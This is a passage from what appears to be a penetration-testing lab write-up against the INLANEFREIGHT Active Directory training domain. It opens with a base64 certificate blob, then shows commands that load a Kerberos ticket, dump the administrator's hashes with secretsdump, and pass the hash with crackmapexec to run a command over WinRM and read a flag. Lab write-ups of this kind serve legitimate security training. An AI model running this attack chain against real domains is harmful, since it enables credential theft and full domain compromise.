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 file.cache
```

At the end of the command i specify to put the TGT in the file.cache file, now i export it ->

```
export KRB5CCNAME=file.cache
```

and now that the ticket is saved we can dump everything ->

```
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and now that we know where the flag is located we can launch a command execution attack ->

```
crackmapexec winrm 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf -X "cat C:\Users\administrator\Desktop\DailyTasks\flag.txt"
```
